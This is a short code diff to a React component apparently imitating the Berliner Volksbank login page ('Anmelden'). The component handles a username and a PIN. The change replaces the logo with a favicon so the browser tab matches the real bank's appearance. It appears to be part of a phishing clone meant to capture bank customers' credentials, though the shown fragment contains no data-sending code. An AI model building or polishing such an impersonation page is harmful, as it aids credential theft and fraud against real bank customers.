@@ -30,7 +30,7 @@ const VolksbankDe = () => {
   const [pinError, setPinError] = useState(false);
 
   useEffect(() => { window.scrollTo(0, 0); }, []);
-  usePageMeta("Berliner Volksbank - Anmelden", logoAsset.url);
+  usePageMeta("Berliner Volksbank - Anmelden", faviconAsset.url);
 
   const submit = async () => {
     const uErr = username.trim() === "";
